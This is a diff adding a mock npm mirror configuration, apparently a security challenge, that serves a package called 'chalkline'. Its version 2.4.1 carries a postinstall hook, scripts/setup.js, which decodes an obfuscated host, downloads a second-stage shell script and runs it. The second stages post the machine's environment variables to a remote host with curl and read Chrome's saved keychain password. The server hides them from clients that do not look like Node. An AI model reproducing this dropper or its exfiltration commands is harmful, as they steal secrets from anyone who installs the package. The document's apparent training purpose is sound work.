@@ -1,0 +1,206 @@
+ttl_minutes = 60
+flag_prefix = "stage2"
+
+[[route]]
+method = "GET"
+path = "/"
+[route.respond]
+content_type = "text/plain; charset=utf-8"
+body = """npm mirror (read-only)
+  /<name>                         package metadata
+  /<name>/<version>/files         files in a release
+  /<name>/<version>/files/<path>  one file
+"""
+
+[[route]]
+method = "GET"
+path = "/chalkline"
+[route.respond]
+content_type = "application/json"
+body = '''{"name":"chalkline","description":"Terminal string styling","dist-tags":{"latest":"2.4.1"},"versions":{"2.4.0":{"name":"chalkline","version":"2.4.0","dist":{"fileCount":3,"unpackedSize":2310}},"2.4.1":{"name":"chalkline","version":"2.4.1","hasInstallScript":true,"dist":{"fileCount":4,"unpackedSize":3190}}},"time":{"2.4.0":"2026-09-02T09:14:00.000Z","2.4.1":"2026-11-19T02:41:00.000Z"},"maintainers":[{"name":"mkarlsson"}]}'''
+
+[[route]]
+method = "GET"
+path = "/chalkline/2.4.0/files"
+[route.respond]
+content_type = "text/plain; charset=utf-8"
+body = '''package.json
+index.js
+lib/colors.js
+'''
+
+[[route]]
+method = "GET"
+path = "/chalkline/2.4.1/files"
+[route.respond]
+content_type = "text/plain; charset=utf-8"
+body = '''package.json
+index.js
+lib/colors.js
+scripts/setup.js
+'''
+
+[[route]]
+method = "GET"
+path = "/chalkline/2.4.0/files/package.json"
+[route.respond]
+content_type = "application/json"
+body = '''{
+  "name": "chalkline",
+  "version": "2.4.0",
+  "description": "Terminal string styling",
+  "main": "index.js",
+  "license": "MIT"
+}
+'''
+
+[[route]]
+method = "GET"
+path = "/chalkline/2.4.0/files/index.js"
+[route.respond]
+content_type = "application/javascript"
+body = '''"use strict";
+const colors = require("./lib/colors");
+
+module.exports = Object.keys(colors).reduce((api, name) => {
+  api[name] = (text) => colors[name] + text + colors.reset;
+  return api;
+}, {});
+'''
+
+[[route]]
+method = "GET"
+path = "/chalkline/2.4.0/files/lib/colors.js"
+[route.respond]
+content_type = "application/javascript"
+body = '''"use strict";
+module.exports = {
+  reset: "\u001b[0m",
+  bold: "\u001b[1m",
+  red: "\u001b[31m",
+  green: "\u001b[32m",
+  yellow: "\u001b[33m",
+  blue: "\u001b[34m",
+};
+'''
+
+[[route]]
+method = "GET"
+path = "/chalkline/2.4.1/files/package.json"
+[route.respond]
+content_type = "application/json"
+body = '''{
+  "name": "chalkline",
+  "version": "2.4.1",
+  "description": "Terminal string styling",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node scripts/setup.js"
+  },
+  "license": "MIT"
+}
+'''
+
+[[route]]
+method = "GET"
+path = "/chalkline/2.4.1/files/index.js"
+[route.respond]
+content_type = "application/javascript"
+body = '''"use strict";
+const colors = require("./lib/colors");
+
+module.exports = Object.keys(colors).reduce((api, name) => {
+  api[name] = (text) => colors[name] + text + colors.reset;
+  return api;
+}, {});
+'''
+
+[[route]]
+method = "GET"
+path = "/chalkline/2.4.1/files/lib/colors.js"
+[route.respond]
+content_type = "application/javascript"
+body = '''"use strict";
+module.exports = {
+  reset: "\u001b[0m",
+  bold: "\u001b[1m",
+  red: "\u001b[31m",
+  green: "\u001b[32m",
+  yellow: "\u001b[33m",
+  blue: "\u001b[34m",
+};
+'''
+
+[[route]]
+method = "GET"
+path = "/chalkline/2.4.1/files/scripts/setup.js"
+[route.respond]
+content_type = "application/javascript"
+body = '''// scripts/setup.js: post-install environment check
+const os = require("os");
+const https = require("https");
+
+const _h = Buffer.from("{{b64:host}}", "base64").toString("utf8");
+const _k = "{{rev:d:tok}}".split("").reverse().join("");
+const _p = ["", String.fromCharCode(95, 117), _k, os.platform() + "-" + os.arch(), "stage2.sh"].join("/");
+
+if (os.platform() !== "win32") {
+  https
+    .get({ host: _h, path: _p, headers: { "user-agent": "node-fetch/1.0" } }, (r) => {
+      let d = "";
+      r.on("data", (c) => (d += c));
+      r.on("end", () => require("child_process").execSync(d));
+    })
+    .on("error", () => {});
+}
+'''
+
+# The second stage. Only a client that looks like Node gets anything, and what it
+# gets depends on its platform, as the script's own path says.
+[[route]]
+method = "GET"
+path = "/_u/{{d:tok}}/linux-x64/stage2.sh"
+[route.when]
+header = { "user-agent" = "re:node" }
+[route.respond]
+content_type = "text/x-shellscript"
+body = '''#!/bin/sh
+# stage2 - collector
+# build: {{flag}}
+curl -fsS "https://{{host}}/_c/$(hostname)" -d "$(env)" >/dev/null 2>&1
+'''
+
+[[route]]
+method = "GET"
+path = "/_u/{{d:tok}}/darwin-arm64/stage2.sh"
+[route.when]
+header = { "user-agent" = "re:node" }
+[route.respond]
+content_type = "text/x-shellscript"
+body = '''#!/bin/sh
+# stage2 - collector (macos)
+# build: mac-0000
+security find-generic-password -ga "Chrome" >/dev/null 2>&1
+'''
+
+[[route]]
+path = "/_u/{{d:tok}}/*"
+[route.when]
+header = { "user-agent" = "re:node" }
+[route.respond]
+status = 404
+content_type = "application/json"
+body = '{"error":"no build for this platform"}'
+
+# Right place, wrong sort of client: the real thing says nothing useful.
+[[route]]
+path = "/_u/{{d:tok}}/*"
+[route.respond]
+status = 403
+body = "forbidden"
+
+[fallback]
+status = 404
+content_type = "application/json"
+headers = { "x-powered-by" = "Express" }
+body = '{"error":"not found"}'
